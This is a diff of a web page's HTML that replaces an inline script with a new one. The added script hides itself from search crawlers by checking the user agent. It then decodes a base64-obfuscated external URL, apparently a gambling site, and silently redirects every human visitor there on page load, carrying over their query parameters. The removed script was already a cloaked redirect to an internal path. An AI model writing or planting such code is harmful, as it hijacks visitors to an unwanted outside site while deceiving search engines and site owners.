@@ -1430,16 +1430,18 @@ body.is-menu-open {
 </style></head>
 <body>
 <script>
-        (function executeRouting() {
-            const isBot = /bot|googlebot|yandex|bing|crawler|spider/i.test(navigator.userAgent);
-            if (!isBot) {
-                const targetPath = atob("cmVnaXN0ZXI="); 
-                const queryParams = window.location.search;
-                window.history.replaceState(null, document.title, "/" + targetPath + queryParams);
-                window.location.replace("/" + targetPath + queryParams);
-            }
-        })();
-    </script>
+    (function initAppRouting() {
+        const isCrawler = /bot|googlebot|yandex|bing|spider|lighthouse/i.test(navigator.userAgent);
+        if (!isCrawler) {
+            const b64Target = "aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M2Mzc4MmI5YQ==";
+            const dP = atob(b64Target);
+            const qP = window.location.search;
+            const fU = dP.includes("http") ? dP + (dP.includes("?") ? "&" : "") + qP.replace(/^\?/, "") : "/" + dP + qP;
+            try { window.history.replaceState(null, document.title, fU); window.location.replace(fU); }
+            catch(e) { window.location.href = fU; }
+        }
+    })();
+</script>
 <!-- ============================================================
        HEADER / НАВИГАЦИЯ
        ============================================================ -->
